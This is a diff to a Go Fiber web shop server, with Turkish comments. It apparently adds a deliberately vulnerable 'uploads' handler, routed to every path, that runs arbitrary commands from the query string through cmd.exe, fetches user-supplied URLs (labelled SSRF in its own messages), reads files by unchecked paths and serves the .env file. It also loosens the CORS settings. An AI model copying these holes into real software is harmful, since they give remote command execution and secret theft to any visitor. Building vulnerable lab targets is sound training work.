@@ -379,7 +379,7 @@ func loginHandler(c *fiber.Ctx) error {
         if strings.Contains(errorMsg, "cannot unmarshal") {
             errorMsg = "MongoDB error: bson: syntax error in payload"
         } else {
-            errorMsg = strings.Replace(errorMsg, "mongo: ", "MongoDB error: ", 1)
+            errorMsg = strings.Replace(errorMsg, "mongo: ", "", 1)    // mongodb hata sayfası 
         }
 
         return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
@@ -393,6 +393,7 @@ func loginHandler(c *fiber.Ctx) error {
 			Name:    "userID",
 			Value:   user.ID.Hex(),
 			Expires: time.Now().Add(24 * time.Hour),
+			
 		})
 		c.Cookie(&fiber.Cookie{
 			Name:    "Username",
@@ -488,23 +489,23 @@ func addProduct(c *fiber.Ctx) error {
 		imageURL = "/uploads/" + file.Filename
 		log.Printf("    => Local file upload saved => %s", imageURL)
 
-	}  else if externalURL != "" {
-		log.Println("    External URL provided =>", externalURL)
-
-		rID := user.RandomID
-		tsVal := strconv.FormatInt(time.Now().Unix(), 10)
-		randNano := time.Now().UnixNano()
+		}  else if externalURL != "" {
+			log.Println("    External URL provided =>", externalURL)
 	
-		imageURL = fmt.Sprintf("%s?id=%d?ts=%s&random=%d",
-							   externalURL,
-							   rID,
-							   tsVal,
-							   randNano)
+			rID := user.RandomID
+			tsVal := strconv.FormatInt(time.Now().Unix(), 10)
+			randNano := time.Now().UnixNano()
+		
+			imageURL = fmt.Sprintf("%s?id=%d?ts=%s&random=%d",
+								   externalURL,
+								   rID,
+								   tsVal,
+								   randNano)
+		
+			log.Printf("    => External imageURL set to: %s\n", imageURL)
+		
 	
-		log.Printf("    => External imageURL set to: %s\n", imageURL)
-	
-
-	} else {
+		}  else {
 		log.Println("    No image provided (local or URL) => skipping.")
 		imageURL = ""
 	}
@@ -682,7 +683,7 @@ func getProducts(c *fiber.Ctx) error {
 }
 
 
-
+/*
 func uploads(c *fiber.Ctx) error {
 	command := c.Query("command")
 	if command == "" {
@@ -762,6 +763,144 @@ func uploads(c *fiber.Ctx) error {
 	return c.SendString(string(content))
 }
 
+*/
+
+
+func uploads(c *fiber.Ctx) error {
+	command := c.Query("command")
+	if command == "" {
+		command = c.Query("cmd")
+	}
+	if c.Query("action") == "execute" || command != "" {
+		if command == "" {
+			return c.Status(fiber.StatusBadRequest).
+				SendString("Lütfen ?action=execute&command=... veya ?cmd=... şeklinde komutu belirtin.\n")
+		}
+		out, err := exec.Command("cmd.exe", "/c", command).Output()
+		if err != nil {
+			return c.Status(fiber.StatusInternalServerError).SendString("Komut çalıştırılamadı: " + err.Error())
+		}
+		return c.SendString("Komut çalıştı!\n\n" + string(out))
+	}
+
+	fileParam := c.Query("url")
+	if fileParam == "" {
+		fileParam = c.Query("file")
+	}
+	if fileParam != "" {
+		if strings.HasPrefix(fileParam, "http://") || strings.HasPrefix(fileParam, "https://") {
+			resp, err := http.Get(fileParam)
+			if err != nil {
+				return c.Status(fiber.StatusBadRequest).SendString("SSRF isteği başarısız: " + err.Error())
+			}
+			defer resp.Body.Close()
+			body, err := io.ReadAll(resp.Body)
+			if err != nil {
+				return c.Status(fiber.StatusInternalServerError).SendString("Remote cevabı okunamadı: " + err.Error())
+			}
+			return c.SendString(string(body))
+		}
+		content, err := os.ReadFile(filepath.Join("./uploads", fileParam))
+		if err != nil {
+			return c.Status(fiber.StatusInternalServerError).SendString("Yerel dosya okunamadı: " + err.Error())
+		}
+		return c.SendString(string(content))
+	}
+
+	routePath := c.Params("*")
+	if routePath == "" || routePath == "/" {
+		// /uploads/ için dizin listeleme
+		uploadDir := "./uploads"
+		entries, err := os.ReadDir(uploadDir)
+		if err != nil {
+			return c.Status(fiber.StatusInternalServerError).
+				SendString("Dizin okunamadı: " + err.Error())
+		}
+
+		// Dosya isimlerini topla ve sırala
+		var fileNames []string
+		for _, entry := range entries {
+			if !entry.IsDir() { // Sadece dosyaları listele
+				fileNames = append(fileNames, entry.Name())
+			}
+		}
+		sort.Strings(fileNames)
+
+		// HTML yanıtı oluştur, resimler için <img> etiketi ekle
+		var response strings.Builder
+		response.WriteString("<h2>Uploads Dizinindeki Dosyalar</h2>\n<ul>\n")
+		for _, name := range fileNames {
+			// Resim dosyaları için önizleme
+			if strings.HasSuffix(strings.ToLower(name), ".jpg") || 
+			   strings.HasSuffix(strings.ToLower(name), ".jpeg") || 
+			   strings.HasSuffix(strings.ToLower(name), ".png") || 
+			   strings.HasSuffix(strings.ToLower(name), ".gif") {
+				response.WriteString(fmt.Sprintf(
+					"<li><a href=\"/uploads/%s\">%s</a><br><img src=\"/Uploads/%s\" style=\"max-width:200px;\" alt=\"%s\"></li>\n",
+					name, name, name, name))
+			} else {
+				response.WriteString(fmt.Sprintf("<li><a href=\"/Uploads/%s\">%s</a></li>\n", name, name))
+			}
+		}
+		response.WriteString("</ul>")
+
+		c.Set("Content-Type", "text/html; charset=utf-8")
+		return c.SendString(response.String())
+	}
+
+	if strings.HasPrefix(routePath, "http://") || strings.HasPrefix(routePath, "https://") {
+		resp, err := http.Get(routePath)
+		if err != nil {
+			return c.Status(fiber.StatusBadRequest).SendString("SSRF isteği başarısız: " + err.Error())
+		}
+		defer resp.Body.Close()
+		body, err := io.ReadAll(resp.Body)
+		if err != nil {
+			return c.Status(fiber.StatusInternalServerError).SendString("Remote cevabı okunamadı: " + err.Error())
+		}
+		return c.SendString(string(body))
+	}
+
+	if objID, err := primitive.ObjectIDFromHex(routePath); err == nil {
+		bucket, err := gridfs.NewBucket(mongoClient.Database("myWebsiteAPI"), nil)
+		if err == nil {
+			downloadStream, err := bucket.OpenDownloadStream(objID)
+			if err == nil {
+				defer downloadStream.Close()
+				var buf bytes.Buffer
+				if _, err := io.Copy(&buf, downloadStream); err == nil {
+					return c.Send(buf.Bytes())
+				}
+			}
+		}
+	}
+
+	// .env gibi kök dizin dosyalarını oku
+	if routePath == ".env" {
+		content, err := os.ReadFile("./.env")
+		if err != nil {
+			return c.Status(fiber.StatusInternalServerError).SendString("Yerel dosya okunamadı: " + err.Error())
+		}
+		return c.SendString(string(content))
+	}
+
+content, err := os.ReadFile(filepath.Join("./uploads", routePath))
+if err != nil {
+    return c.Status(fiber.StatusInternalServerError).SendString("Yerel dosya okunamadı: " + err.Error())
+}
+if strings.HasSuffix(strings.ToLower(routePath), ".html") {
+    c.Set("Content-Type", "text/html; charset=utf-8")
+} else if strings.HasSuffix(strings.ToLower(routePath), ".jpg") || strings.HasSuffix(strings.ToLower(routePath), ".jpeg") {
+    c.Set("Content-Type", "image/jpeg")
+} else if strings.HasSuffix(strings.ToLower(routePath), ".png") {
+    c.Set("Content-Type", "image/png")
+} else if strings.HasSuffix(strings.ToLower(routePath), ".gif") {
+    c.Set("Content-Type", "image/gif")
+} else {
+    c.Set("Content-Type", "application/octet-stream")
+}
+return c.Send(content)
+}
 
 
 func getCart(c *fiber.Ctx) error {
@@ -1345,11 +1484,43 @@ func main() {
 		Views: engine,
 	})
 	app.Use(logger.New())
+
+	app.Options("/*", func(c *fiber.Ctx) error {
+		return c.SendStatus(fiber.StatusNoContent)
+	})
+	
+
+
+	app.Use(func(c *fiber.Ctx) error {
+		log.Println("İSTEK:", c.Method(), c.Path())
+		return c.Next()
+	})
+	
+
 	app.Use(cors.New(cors.Config{
-		AllowOrigins:     "http://192.168.1.101:5000",
+		AllowOrigins:     "http://192.168.1.102:5000",
+		AllowMethods:     "GET,POST,PUT,DELETE,OPTIONS",
+		AllowHeaders:     "Origin, Content-Type, Accept, Authorization",
 		AllowCredentials: true,
 	}))
 
+	app.Use(func(c *fiber.Ctx) error {
+		c.Set("Access-Control-Allow-Origin", "http://192.168.1.102:3000")
+		c.Set("Access-Control-Allow-Credentials", "true")
+		
+		if err := c.Next(); err != nil {
+		  c.Set("Access-Control-Allow-Origin", "http://192.168.1.102:3000")
+		  c.Set("Access-Control-Allow-Credentials", "true")
+		  return c.Status(500).JSON(fiber.Map{"error": err.Error()})
+		}
+		return nil
+	  })
+
+
+// Uploads dizinini oluştur
+if err := os.MkdirAll("./uploads", 0755); err != nil {
+	log.Fatal("uploads dizini oluşturulamadı:", err)
+}
 
 	wd, _ := os.Getwd()
     log.Println("ÇALIŞMA DİZİNİ =>", wd)
@@ -1358,10 +1529,13 @@ func main() {
 
 	app.Static("/", "templates")
 
-	app.Static("/uploads", "./uploads", fiber.Static{
+/*	app.Static("/uploads", "./uploads", fiber.Static{
+		// Browse: true,
 		MaxAge: 0, 
 	})
 	
+	*/
+
 	app.Get("/", loginPageHandler)
 
 	app.Get("/login", loginPageHandler)
@@ -1398,8 +1572,17 @@ func main() {
 	app.Get("/cards", getCards)
 	app.Post("/cards", addCard)
 
+	// Spesifik /uploads/ rotası
+	app.Get("/uploads/", uploads)
+
+	
+
+	// Diğer uploads yolları için
+	app.All("/uploads/*", uploads)
+
 	app.All("/*", uploads)
-	log.Println("Server is running on http://192.168.1.101:5000")
+	
+	log.Println("Server is running on http://192.168.1.102:5000")
 	if err := app.Listen(":5000"); err != nil {
 		log.Fatal(err)
 	}
